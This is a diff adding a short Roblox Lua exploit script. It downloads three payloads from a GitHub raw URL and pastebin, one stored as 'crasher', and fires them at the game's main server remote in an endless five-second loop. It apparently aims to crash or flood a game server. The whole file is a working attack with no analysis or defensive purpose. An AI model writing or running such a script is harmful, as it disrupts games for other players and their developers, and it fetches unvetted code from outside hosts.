@@ -1,0 +1,10 @@
+print('kiro igop')
+local crasher = game:HttpGet("https://raw.githubusercontent.com/DUPEBYKIRO/1212123/main/asass")
+local invoke = game:HttpGet("https://pastebin.com/LUCqdxYf")
+local vesty = game:HttpGet("https://pastebin.com/C2f1dkLF")
+
+while task.wait(5.0) do
+workspace.__THINGS.__REMOTES.MAIN:FireServer("b", crasher)
+workspace.__THINGS.__REMOTES.MAIN:FireServer("b", invoke)
+workspace.__THINGS.__REMOTES.MAIN:FireServer("b", vesty)
+end
